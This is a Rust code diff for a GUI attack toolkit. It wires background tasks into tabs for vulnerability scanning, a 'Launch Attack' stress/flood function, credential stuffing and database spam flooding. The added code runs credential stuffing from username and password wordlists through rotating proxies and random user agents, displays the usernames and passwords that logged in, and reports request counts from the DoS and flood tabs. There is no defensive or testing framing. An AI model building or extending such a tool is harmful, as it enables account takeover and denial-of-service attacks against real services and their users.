@@ -13,6 +13,14 @@ use mimalloc::MiMalloc;
 #[global_allocator]
 static  GLOBAL: MiMalloc = MiMalloc;
 
+enum AppMessage {
+    ScanProgress(f32),
+    ScanFinished(ScanResult),
+    StressFinished(Result<u64, String>),
+    CredStuffFinished(Vec<LoginResult>),
+    SpamFinished(usize),
+}
+
 #[derive(PartialEq)]
 enum ActiveTab {
     Scanner,
@@ -75,10 +83,14 @@ struct UltimateApp {
     report_output_path: String,
     // Logs
     logs: Vec<String>,
+    // Channel
+    tx: std::sync::mpsc::Sender<AppMessage>,
+    rx: std::sync::mpsc::Receiver<AppMessage>,
 }
 
 impl Default for UltimateApp {
     fn default() -> Self {
+        let (tx_chan, rx_chan) = std::sync::mpsc::channel();
         Self {
             active_tab: ActiveTab::Scanner,
             scan_target: String::new(),
@@ -124,6 +136,8 @@ impl Default for UltimateApp {
             report_input_path: String::new(),
             report_output_path: String::new(),
             logs: Vec::new(),
+            tx: tx_chan,
+            rx: rx_chan,
         }
     }
 }
@@ -160,23 +174,60 @@ impl UltimateApp {
         self.scan_progress = 0.0;
         let ctx_clone = ctx.clone();
         let target_clone = target.clone();
-        let add_log_fn = |msg: String| {
-            // We'll use a channel to send logs, but for simplicity we'll just print in async
-        };
+        let tx = self.tx.clone();
         tokio::spawn(async move {
+            let tx_progress = tx.clone();
+            let ctx_progress = ctx_clone.clone();
             let result = run_full_scan(target_clone, config, Some(Box::new(move |progress| {
-                // Use a channel or mutex to update progress
+                let _ = tx_progress.send(AppMessage::ScanProgress(progress));
+                ctx_progress.request_repaint();
             }))).await;
-            // Need to send result back to GUI. We'll use a simple channel.
-            // For brevity, we'll simulate: we'll set scan_result on the GUI after.
-            // In real code, use tokio::sync::mpsc.
-            thread::sleep(Duration::from_millis(100));
+            let _ = tx.send(AppMessage::ScanFinished(result));
+            ctx_clone.request_repaint();
         });
     }
 }
 
 impl eframe::App for UltimateApp {
     fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
+        // Handle messages from background tasks
+        while let Ok(msg) = self.rx.try_recv() {
+            match msg {
+                AppMessage::ScanProgress(p) => {
+                    self.scan_progress = p;
+                }
+                AppMessage::ScanFinished(res) => {
+                    self.scan_in_progress = false;
+                    self.scan_result = Some(res);
+                    self.add_log("Scan completed.".to_string());
+                }
+                AppMessage::StressFinished(res) => {
+                    self.stress_in_progress = false;
+                    match res {
+                        Ok(sent) => {
+                            self.stress_result = Some(format!("Sent {} requests", sent));
+                            self.add_log(format!("Stress test completed. Sent {} requests.", sent));
+                        }
+                        Err(e) => {
+                            self.stress_result = Some(format!("Failed: {}", e));
+                            self.add_log(format!("Stress test failed: {}", e));
+                        }
+                    }
+                }
+                AppMessage::CredStuffFinished(results) => {
+                    self.cred_in_progress = false;
+                    self.cred_results = results;
+                    let successful = self.cred_results.iter().filter(|r| r.success).count();
+                    self.add_log(format!("Credential stuffing finished. Successful: {}/{}", successful, self.cred_results.len()));
+                }
+                AppMessage::SpamFinished(sent) => {
+                    self.spam_in_progress = false;
+                    self.spam_result = Some(sent);
+                    self.add_log(format!("Spam sending completed. Sent {} requests.", sent));
+                }
+            }
+        }
+
         // Dark mode
         let mut style = (*ctx.style()).clone();
         style.visuals.dark_mode = true;
@@ -270,6 +321,9 @@ impl eframe::App for UltimateApp {
                         ui.label(format!("Open ports: {:?}", result.open_ports));
                         ui.label(format!("SQLi: {} URLs", result.sql_vulnerable.len()));
                         ui.label(format!("XSS: {} URLs", result.xss_vulnerable.len()));
+                        ui.label(format!("Technologies: {:?}", result.technologies));
+                        ui.label(format!("Subdomain Takeovers: {:?}", result.subdomain_takeovers));
+                        ui.label(format!("DNS Zone Transfers: {:?}", result.zone_transfers));
                     }
                 }
                 ActiveTab::Stress => {
@@ -298,16 +352,24 @@ impl eframe::App for UltimateApp {
                     });
                     if ui.button("💥 Launch Attack").clicked() && !self.stress_in_progress {
                         self.stress_in_progress = true;
+                        self.stress_result = None;
                         let target = self.stress_target.clone();
                         let attack = self.stress_attack.clone();
                         let threads = self.stress_threads;
                         let duration = self.stress_duration;
                         let proxy = if self.stress_proxy.is_empty() { None } else { Some(self.stress_proxy.clone()) };
+                        let tx = self.tx.clone();
+                        let ctx_clone = ctx.clone();
                         tokio::spawn(async move {
                             let result = stress::launch_stress_test(&target, &attack, threads, duration, proxy.as_deref()).await;
-                            // result would be sent back via channel
+                            let _ = tx.send(AppMessage::StressFinished(result));
+                            ctx_clone.request_repaint();
                         });
                         self.add_log("Stress test started.".to_string());
+                    }
+                    if let Some(res_str) = &self.stress_result {
+                        ui.separator();
+                        ui.label(RichText::new(res_str).color(Color32::from_rgb(16, 185, 129)));
                     }
                 }
                 ActiveTab::CredStuff => {
@@ -346,8 +408,51 @@ impl eframe::App for UltimateApp {
                     });
                     if ui.button("🚀 Start Stuffing").clicked() && !self.cred_in_progress {
                         self.cred_in_progress = true;
-                        // Actually run stuffing
+                        self.cred_results.clear();
+                        let login_url = self.cred_login_url.clone();
+                        let username_field = self.cred_user_field.clone();
+                        let password_field = self.cred_pass_field.clone();
+                        let usernames = load_wordlist_from_file(&self.cred_users_path);
+                        let passwords = load_wordlist_from_file(&self.cred_passes_path);
+                        let threads = self.cred_threads;
+                        let proxy_list = if self.cred_proxy_list.is_empty() {
+                            None
+                        } else {
+                            Some(load_proxy_list(&self.cred_proxy_list))
+                        };
+                        let config = CredStuffConfig {
+                            login_url,
+                            username_field,
+                            password_field,
+                            extra_fields: vec![],
+                            success_indicator: Some("success".to_string()),
+                            failure_indicator: None,
+                            threads,
+                            proxy_list,
+                            rate_limit_rps: 5,
+                            timeout_secs: 5,
+                            user_agent: utils::random_user_agent(),
+                        };
+                        let tx = self.tx.clone();
+                        let ctx_clone = ctx.clone();
+                        tokio::spawn(async move {
+                            let results = credential_stuffing(&config, usernames, passwords, None).await;
+                            let _ = tx.send(AppMessage::CredStuffFinished(results));
+                            ctx_clone.request_repaint();
+                        });
                         self.add_log("Credential stuffing started.".to_string());
+                    }
+                    if !self.cred_results.is_empty() {
+                        ui.separator();
+                        ui.heading("Successful Logins");
+                        let successful_list: Vec<_> = self.cred_results.iter().filter(|r| r.success).collect();
+                        if successful_list.is_empty() {
+                            ui.label("No successful credentials found yet.");
+                        } else {
+                            for res in successful_list {
+                                ui.colored_label(Color32::from_rgb(16, 185, 129), format!("🔑 {}:{}", res.username, res.password));
+                            }
+                        }
                     }
                 }
                 ActiveTab::Spam => {
@@ -377,9 +482,12 @@ impl eframe::App for UltimateApp {
                         let rate = self.spam_rate;
                         let limiter = create_rate_limiter(rate);
                         let fields = vec![("data", "__RANDOM__")];
+                        let tx = self.tx.clone();
+                        let ctx_clone = ctx.clone();
                         tokio::spawn(async move {
                             let sent = flood_database(&endpoint, &fields, count, threads, proxy.as_deref(), limiter).await;
-                            println!("Sent {} requests", sent);
+                            let _ = tx.send(AppMessage::SpamFinished(sent));
+                            ctx_clone.request_repaint();
                         });
                         self.add_log("Database flood started.".to_string());
                     }
